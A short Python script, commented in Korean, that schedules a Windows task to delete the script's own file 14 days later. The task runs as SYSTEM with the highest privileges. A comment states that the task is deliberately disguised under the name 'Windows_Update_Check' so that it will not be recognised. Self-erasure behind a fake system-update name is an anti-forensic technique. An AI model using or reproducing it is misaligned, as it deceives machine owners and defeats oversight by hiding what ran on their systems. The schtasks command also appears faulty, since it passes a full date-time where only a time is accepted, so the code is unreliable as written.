import os
import subprocess
from datetime import datetime, timedelta

# 현재 실행 중인 파일 경로
script_path = os.path.abspath(__file__)

# 14일 후 예약 실행
delete_date = (datetime.now() + timedelta(days=14)).strftime("%Y-%m-%dT%H:%M:%S")

# 비트플로우가 아니라 다른걸로 이름을 씌워서 못알아보게 함
task_name = "Windows_Update_Check"

# Windows 작업 스케줄러에 삭제 예약 (숨김모드)
task_command = f"""
schtasks /create /tn "{task_name}" /tr "cmd /c timeout /t 3 && del /f /q \"{script_path}\"" /sc once /st {delete_date} /f /ru SYSTEM /RL HIGHEST /IT
"""

subprocess.run(task_command, shell=True)
